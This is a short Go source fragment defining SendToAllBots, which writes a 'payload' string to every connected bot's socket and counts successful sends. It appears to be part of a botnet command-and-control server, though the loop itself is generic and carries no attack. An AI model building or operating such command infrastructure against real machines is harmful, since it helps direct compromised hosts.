package socket

import "fmt"

func SendToAllBots(Payload string) int {
	sent := 0

	for _, bot := range BotList {
		_, err := bot.Network.Socket.Write([]byte(fmt.Sprintf("%s\n", Payload)))

		if err != nil {
			bot.Network.Connected = false
			continue
		}

		sent++
	}

	return sent
}
